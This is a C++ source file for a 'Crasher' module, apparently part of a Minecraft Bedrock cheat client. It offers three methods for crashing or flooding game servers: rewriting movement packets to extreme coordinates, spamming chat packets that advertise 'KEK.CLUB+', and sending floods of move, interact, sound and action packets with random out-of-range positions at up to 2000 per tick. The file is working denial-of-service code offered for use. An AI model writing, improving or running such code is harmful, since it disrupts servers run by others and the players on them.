#include "Crasher.h"

Crasher::Crasher() : IModule(0, Category::MISC, "funni packet exploitation") {
	registerIntSetting("PPT", &CrasherPPS, CrasherPPS, 1, 2000);  // Packets Per Tick
	registerEnumSetting("Method", &method, 0);
	method = (*new SettingEnum(this))
		.addEntry(EnumEntry("Realm", 0)).
		addEntry(EnumEntry("MsgBarrage", 1)).
		addEntry(EnumEntry("Test", 2));
}
Crasher::~Crasher() {
}

const char* Crasher::getModuleName() {
	return "Crasher";
}

void Crasher::onEnable() {
}

void Crasher::onTick(C_GameMode* gm) {
	if (method.selected == 1) {
		for (int MsgPpt = 0; MsgPpt < CrasherPPS; MsgPpt++) {
			C_TextPacket textPacket;
			textPacket.message.setText(Utils::randomString(random(3,4)) + " |  KEK.CLUB+ ON TOP  | " + Utils::randomString(random(5,7)));
			textPacket.messageType = 3;
			textPacket.sourceName.setText(g_Data.getLocalPlayer()->getNameTag()->getText());
			textPacket.xboxUserId = std::to_string(g_Data.getLocalPlayer()->getUserId());
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
		}
	}
	if (method.selected == 2) {
		C_SubChunkRequestPacket chunk;
		g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&chunk);
		for (int PacketPpt = 0; PacketPpt < CrasherPPS; PacketPpt++) {
			//Try NAN next
			C_MovePlayerPacket randG(g_Data.getLocalPlayer(), g_Data.getLocalPlayer()->getPos()->add(vec3_t(RandomFloat(-999999.f, 99999.f), RandomFloat(-.30f, 55.f), RandomFloat(-999999.f, 99999.f))), true);
			PlayerAuthInputPacket cum;
			cum.pos.x = RandomFloat(-999999.f, 99999.f);
			cum.pos.y = RandomFloat(-.30f, 55.f);
			cum.pos.z = RandomFloat(-999999.f, 99999.f);
			C_InteractPacket interact;
			interact.pos.x = RandomFloat(-999999.f, 99999.f);
			interact.pos.y = RandomFloat(-.30f, 55.f);
			interact.pos.z = RandomFloat(-999999.f, 99999.f);
			LevelSoundEventPacket sound;
			sound.sound = random(1, 10);
			sound.pos.x = RandomFloat(-999999.f, 99999.f);
			sound.pos.y = RandomFloat(-.30f, 55.f);
			sound.pos.z = RandomFloat(-999999.f, 99999.f);
			C_PlayerActionPacket act;
			act.action = random(1, 10);
			act.blockPosition.x = RandomFloat(-999999.f, 99999.f);
			act.blockPosition.y = RandomFloat(-.30f, 55.f);
			act.blockPosition.z = RandomFloat(-999999.f, 99999.f);
			C_AnimatePacket anim;
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&interact);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&randG);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&cum);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&sound);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&act);
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&anim);
		}
	}
}

void Crasher::onSendPacket(C_Packet* packet) {
	if (method.selected == 0) {
		if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
			PlayerAuthInputPacket* authInputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
			authInputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
			authInputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
			authInputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
		} else if (packet->isInstanceOf<C_MovePlayerPacket>()) {
			C_MovePlayerPacket* movePacket = reinterpret_cast<C_MovePlayerPacket*>(packet);
			movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
			movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
			movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
		}
	}
}
